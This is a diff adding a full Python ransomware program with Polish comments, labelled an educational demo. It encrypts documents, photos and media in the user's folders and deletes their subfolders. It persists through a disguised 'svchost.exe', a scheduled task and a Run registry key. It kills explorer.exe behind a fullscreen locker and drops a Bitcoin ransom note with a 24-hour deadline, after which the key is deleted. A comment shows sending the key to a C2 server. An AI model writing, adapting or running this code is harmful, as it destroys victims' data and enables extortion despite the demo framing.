@@ -1,0 +1,455 @@
+"""
+RANSOMWARE DEMO - WYŁĄCZNIE DO CELÓW EDUKACYJNYCH
+Analiza mechanizmów działania złośliwego oprogramowania
+NIE URUCHAMIAJ na swoim komputerze!
+"""
+
+from cryptography.fernet import Fernet
+import tkinter as tk
+from tkinter import messagebox
+import os
+import shutil
+import threading
+import subprocess
+import time
+import base64
+import io
+import sys
+import ctypes
+import random
+from PIL import Image, ImageTk
+
+# ============ KONFIGURACJA ============
+PASSWORD = "admin"  # W prawdziwym ransomware to byłby kod z serwera C2
+COUNTDOWN_SECONDS = 24 * 60 * 60  # 24h
+APPDATA_DIR = os.path.join(os.environ.get("APPDATA", ""), "WindowsUpdateService")
+TIMESTAMP_FILE = os.path.join(APPDATA_DIR, ".timestamp")
+STARTUP_DIR = os.path.join(os.environ.get("APPDATA", ""), r"Microsoft\Windows\Start Menu\Programs\Startup")
+
+# ============ 1. SZYFROWANIE PLIKÓW (z EcryptionCode.txt) ============
+class FileEncryptor:
+    def __init__(self):
+        self.key = Fernet.generate_key()
+        self.f = Fernet(self.key)
+        self.encrypted_count = 0
+        
+        # Zapisz klucz do pliku (w prawdziwym ransomware wysyłany do C2)
+        self.save_key_to_c2()
+        
+        # Rozszerzenia do szyfrowania
+        self.target_extensions = (".txt", ".doc", ".docx", ".pdf", ".rtf", ".odt", 
+                                   ".xls", ".xlsx", ".csv", ".json", ".xml", ".ppt", 
+                                   ".pptx", ".odp", ".jpg", ".jpeg", ".png", ".gif", 
+                                   ".bmp", ".tiff", ".mp3", ".wav", ".ogg", ".flac", 
+                                   ".mp4", ".avi", ".mov", ".mkv", ".zip", ".rar", 
+                                   ".7z", ".tar", ".gz", ".iso", ".log", ".bak")
+    
+    def save_key_to_c2(self):
+        """W prawdziwym ransomware: wysyła klucz do serwera C2"""
+        key_path = os.path.join(APPDATA_DIR, "encryption_key.key")
+        os.makedirs(APPDATA_DIR, exist_ok=True)
+        with open(key_path, "wb") as f:
+            f.write(self.key)
+        # W realnym ataku: requests.post("https://c2-server.com/key", data=self.key)
+    
+    def get_target_folders(self):
+        """Pobiera foldery ofiary (tak jak w EcryptionCode.txt)"""
+        return [
+            os.path.expandvars("%USERPROFILE%/Documents"),
+            os.path.expandvars("%USERPROFILE%/Downloads"),
+            os.path.expandvars("%USERPROFILE%/Desktop"),
+            os.path.expandvars("%USERPROFILE%/Pictures"),
+            os.path.expandvars("%USERPROFILE%/Music"),
+            os.path.expandvars("%USERPROFILE%/Videos"),
+        ]
+    
+    def encrypt_file(self, file_path):
+        """Szyfruje pojedynczy plik"""
+        try:
+            with open(file_path, "rb") as file:
+                file_data = file.read()
+            
+            encrypted_data = self.f.encrypt(file_data)
+            
+            with open(file_path, "wb") as file:
+                file.write(encrypted_data)
+            
+            self.encrypted_count += 1
+            return True
+        except (PermissionError, IOError):
+            return False
+    
+    def delete_subfolders(self, folder_path):
+        """Usuwa wszystkie podfoldery (destrukcyjne działanie)"""
+        try:
+            for item in os.listdir(folder_path):
+                item_path = os.path.join(folder_path, item)
+                if os.path.isdir(item_path):
+                    shutil.rmtree(item_path)
+        except Exception:
+            pass
+    
+    def start_encryption(self):
+        """Główna pętla szyfrowania"""
+        print(f"[*] Rozpoczynanie szyfrowania... Klucz: {self.key}")
+        
+        for folder in self.get_target_folders():
+            if not os.path.exists(folder):
+                continue
+                
+            print(f"[*] Szyfrowanie w: {folder}")
+            
+            # Szyfruj pliki
+            for file in os.listdir(folder):
+                if file.lower().endswith(self.target_extensions):
+                    full_path = os.path.join(folder, file)
+                    self.encrypt_file(full_path)
+            
+            # Usuń podfoldery
+            self.delete_subfolders(folder)
+        
+        # Dodaj plik z informacją o okupie
+        self.create_ransom_note()
+        
+        print(f"[+] Zaszyfrowano {self.encrypted_count} plików")
+        return self.encrypted_count
+    
+    def create_ransom_note(self):
+        """Tworzy plik README.txt z instrukcją zapłaty"""
+        desktop = os.path.expandvars("%USERPROFILE%/Desktop")
+        note_path = os.path.join(desktop, "HOW_TO_DECRYPT.txt")
+        
+        note_content = f"""
+========================================
+  YOUR FILES HAVE BEEN ENCRYPTED!
+========================================
+
+All your important documents, photos, videos, and files have been encrypted with military-grade encryption.
+
+To decrypt your files, you need to pay $500 in Bitcoin to the following address:
+
+    bc1qxy2kgdlgjq5rh40q7y6h8wjq5x2k9lq5x2k9lq
+
+After payment, enter the code "admin" in the locker screen.
+
+You have 24 hours before the decryption key is destroyed forever.
+
+========================================
+        """
+        
+        with open(note_path, "w") as f:
+            f.write(note_content)
+
+# ============ 2. PERSISTENCJA (autostart) ============
+class Persistence:
+    @staticmethod
+    def install():
+        """Instaluje się w autostarcie (wiele metod)"""
+        try:
+            # Metoda 1: Kopiuj do AppData
+            os.makedirs(APPDATA_DIR, exist_ok=True)
+            
+            # Kopiuj aktualny plik
+            current_file = sys.executable if getattr(sys, 'frozen', False) else __file__
+            target_file = os.path.join(APPDATA_DIR, "svchost.exe")
+            
+            if os.path.abspath(current_file) != os.path.abspath(target_file):
+                shutil.copy2(current_file, target_file)
+            
+            # Metoda 2: Task Scheduler (uruchamia się przed explorerem)
+            try:
+                subprocess.run([
+                    "schtasks", "/Create", "/TN", "WindowsUpdateService",
+                    "/TR", target_file, "/SC", "ONLOGON", "/RL", "HIGHEST", "/F"
+                ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            except:
+                pass
+            
+            # Metoda 3: Rejestr (HKCU\Software\Microsoft\Windows\CurrentVersion\Run)
+            try:
+                import winreg
+                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 
+                                    r"Software\Microsoft\Windows\CurrentVersion\Run",
+                                    0, winreg.KEY_SET_VALUE)
+                winreg.SetValueEx(key, "WindowsUpdateService", 0, winreg.REG_SZ, target_file)
+                winreg.CloseKey(key)
+            except:
+                pass
+            
+            # Zapisz timestamp
+            with open(TIMESTAMP_FILE, "w") as f:
+                f.write(str(time.time()))
+                
+        except Exception as e:
+            print(f"[-] Persistence error: {e}")
+    
+    @staticmethod
+    def remove():
+        """Usuwa autostart (przy odblokowaniu)"""
+        try:
+            subprocess.run(["schtasks", "/Delete", "/TN", "WindowsUpdateService", "/F"],
+                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        except:
+            pass
+        
+        try:
+            import winreg
+            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
+                                r"Software\Microsoft\Windows\CurrentVersion\Run",
+                                0, winreg.KEY_SET_VALUE)
+            winreg.DeleteValue(key, "WindowsUpdateService")
+            winreg.CloseKey(key)
+        except:
+            pass
+
+# ============ 3. EKRAN BLOKADY (z fsociety_locker.txt) ============
+class RansomwareLocker:
+    def __init__(self, encrypted_count):
+        self.root = tk.Tk()
+        self.encrypted_count = encrypted_count
+        self.start_time = self.get_start_timestamp()
+        self.unlocked = False
+        
+        # Konfiguracja okna
+        self.root.title("FSOCIETY RANSOMWARE")
+        self.root.configure(bg="black")
+        self.root.attributes("-fullscreen", True)
+        self.root.attributes("-topmost", True)
+        self.root.overrideredirect(True)
+        
+        # Blokada klawiszy systemowych
+        self.block_system_keys()
+        
+        # Zabij explorera (żeby nie można było ominąć)
+        self.kill_explorer()
+        
+        # UI
+        self.build_ui()
+        
+        # Timer
+        self.update_timer()
+        
+        # Efekty wizualne
+        self.glitch_effect()
+        
+        self.root.mainloop()
+    
+    def get_start_timestamp(self):
+        try:
+            if os.path.exists(TIMESTAMP_FILE):
+                with open(TIMESTAMP_FILE, "r") as f:
+                    return float(f.read().strip())
+        except:
+            pass
+        return time.time()
+    
+    def block_system_keys(self):
+        """Blokuje Alt+F4, Ctrl+Alt+Del itp."""
+        def on_key(event):
+            # Blokuj niebezpieczne kombinacje
+            if event.keysym in ['Alt_L', 'Alt_R', 'F4', 'Escape']:
+                return "break"
+            if event.state & 0x4 and event.keysym in ['Tab', 'F4']:  # Alt+Tab, Alt+F4
+                return "break"
+            return None
+        
+        self.root.bind('<Alt-F4>', lambda e: "break")
+        self.root.bind('<Control-Alt-Delete>', lambda e: "break")
+        self.root.bind('<Key>', on_key)
+    
+    def kill_explorer(self):
+        """Zabija explorer.exe"""
+        try:
+            subprocess.run(["taskkill", "/F", "/IM", "explorer.exe"],
+                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        except:
+            pass
+    
+    def build_ui(self):
+        """Interfejs blokady (styl fsociety)"""
+        main_frame = tk.Frame(self.root, bg="black")
+        main_frame.place(relx=0.5, rely=0.5, anchor="center")
+        
+        # Tytuł
+        title = tk.Label(main_frame, text="F S O C I E T Y", 
+                        font=("Consolas", 48, "bold"),
+                        fg="#00ff41", bg="black")
+        title.pack(pady=20)
+        
+        # Wiadomość
+        msg = f"""
+========================================
+  YOUR FILES HAVE BEEN ENCRYPTED!
+========================================
+
+{self.encrypted_count} files have been encrypted with AES-256.
+
+To decrypt your files, you need to pay $500 in Bitcoin.
+
+Enter the decryption key (received after payment) below.
+
+========================================
+        """
+        
+        msg_label = tk.Label(main_frame, text=msg, font=("Consolas", 12),
+                            fg="#ff0000", bg="black", justify="left")
+        msg_label.pack(pady=10)
+        
+        # Timer
+        self.timer_label = tk.Label(main_frame, text="", font=("Consolas", 36, "bold"),
+                                   fg="#ff0000", bg="black")
+        self.timer_label.pack(pady=20)
+        
+        # Pole hasła
+        pwd_frame = tk.Frame(main_frame, bg="black")
+        pwd_frame.pack(pady=10)
+        
+        tk.Label(pwd_frame, text="DECRYPTION KEY:", font=("Consolas", 14),
+                fg="#00ff41", bg="black").pack(side="left")
+        
+        self.pwd_entry = tk.Entry(pwd_frame, font=("Consolas", 14), width=30,
+                                 bg="#0a0a0a", fg="#00ff41", show="*")
+        self.pwd_entry.pack(side="left", padx=10)
+        self.pwd_entry.bind("<Return>", self.check_password)
+        self.pwd_entry.focus()
+        
+        # Przycisk
+        decrypt_btn = tk.Button(main_frame, text="[ DECRYPT ]", font=("Consolas", 12, "bold"),
+                               fg="#00ff41", bg="#0a0a0a", command=self.check_password)
+        decrypt_btn.pack(pady=10)
+        
+        # Status
+        self.status_label = tk.Label(main_frame, text="", font=("Consolas", 12),
+                                    fg="#ff0000", bg="black")
+        self.status_label.pack(pady=5)
+    
+    def update_timer(self):
+        """Aktualizuje odliczanie"""
+        elapsed = time.time() - self.start_time
+        remaining = max(0, COUNTDOWN_SECONDS - int(elapsed))
+        
+        hours = remaining // 3600
+        minutes = (remaining % 3600) // 60
+        seconds = remaining % 60
+        
+        self.timer_label.config(text=f"{hours:02d}:{minutes:02d}:{seconds:02d}")
+        
+        if remaining > 0:
+            self.root.after(1000, self.update_timer)
+        else:
+            self.timeout_destroy()
+    
+    def glitch_effect(self):
+        """Efekt glitch dla tytułu"""
+        def glitch():
+            if random.random() < 0.1:
+                # Zmiana tytułu na losowe znaki
+                pass
+            self.root.after(random.randint(2000, 5000), glitch)
+        glitch()
+    
+    def check_password(self, event=None):
+        """Sprawdza hasło i odblokowuje"""
+        password = self.pwd_entry.get()
+        
+        if password == PASSWORD:
+            self.unlock_system()
+        else:
+            self.status_label.config(text="[ACCESS DENIED] Wrong decryption key!")
+            self.pwd_entry.delete(0, tk.END)
+            self.root.configure(bg="#1a0000")
+            self.root.after(200, lambda: self.root.configure(bg="black"))
+    
+    def unlock_system(self):
+        """Odblokowuje system (w prawdziwym: pobiera klucz z C2 i deszyfruje)"""
+        self.unlocked = True
+        
+        # Animacja odblokowania
+        self.status_label.config(text="[ACCESS GRANTED] Decrypting files...", fg="#00ff41")
+        
+        def decrypt_animation(step=0):
+            steps = ["█░░░░░░░░░ 10%", "███░░░░░░░ 30%", "█████░░░░░ 50%",
+                    "███████░░░ 70%", "█████████░ 90%", "██████████ 100%"]
+            
+            if step < len(steps):
+                self.status_label.config(text=f"[DECRYPTING] {steps[step]}")
+                self.root.after(800, lambda: decrypt_animation(step + 1))
+            else:
+                self.status_label.config(text="[COMPLETE] System unlocked. You are free.")
+                self.root.after(2000, self.cleanup_and_exit)
+        
+        decrypt_animation()
+    
+    def cleanup_and_exit(self):
+        """Czyści ślady i restartuje explorer"""
+        Persistence.remove()
+        
+        # Usuń plik z kluczem
+        try:
+            key_path = os.path.join(APPDATA_DIR, "encryption_key.key")
+            if os.path.exists(key_path):
+                os.remove(key_path)
+        except:
+            pass
+        
+        # Restart explorera
+        try:
+            subprocess.Popen("explorer.exe")
+        except:
+            pass
+        
+        self.root.destroy()
+        sys.exit(0)
+    
+    def timeout_destroy(self):
+        """Po odliczeniu: niszczy klucz (w realnym ataku)"""
+        self.status_label.config(text="[SYSTEM DESTROYED] Time expired! All data lost forever.")
+        
+        # Usuń klucz - pliki zostaną zaszyfrowane na zawsze
+        try:
+            key_path = os.path.join(APPDATA_DIR, "encryption_key.key")
+            if os.path.exists(key_path):
+                os.remove(key_path)
+        except:
+            pass
+
+# ============ 4. GŁÓWNY KONTROLER ============
+class RansomwareController:
+    def __init__(self):
+        print("[*] Inicjalizacja ransomware...")
+        
+        # 1. Instaluj persistencję
+        Persistence.install()
+        
+        # 2. Szyfruj pliki w tle
+        self.encryptor = FileEncryptor()
+        encryption_thread = threading.Thread(target=self.encryptor.start_encryption)
+        encryption_thread.daemon = True
+        encryption_thread.start()
+        
+        # 3. Poczekaj na zakończenie szyfrowania (maks 30s)
+        encryption_thread.join(timeout=30)
+        
+        # 4. Pokaż ekran blokady
+        RansomwareLocker(self.encryptor.encrypted_count)
+
+# ============ START ============
+if __name__ == "__main__":
+    # OSTRZEŻENIE DLA OSÓB TESTUJĄCYCH
+    print("="*60)
+    print("UWAGA! To jest PRAWDZIWY ransomware!")
+    print("Zaszyfruje WSZYSTKIE pliki w folderach użytkownika!")
+    print("Tylko hasło 'admin' je odszyfruje (demo).")
+    print("="*60)
+    
+    confirm = input("Czy na pewno chcesz uruchomić? (wpisz 'TEST' aby kontynuować): ")
+    
+    if confirm == "TEST":
+        print("[*] Uruchamianie w trybie testowym...")
+        print("[!] ZASZYFROWANIE PLIKÓW ZA 5 SEKUND! NACIŚNIJ CTRL+C ABY PRZERWAĆ!")
+        time.sleep(5)
+        
+        controller = RansomwareController()
+    else:
+        print("Anulowano.")
+        sys.exit(0)
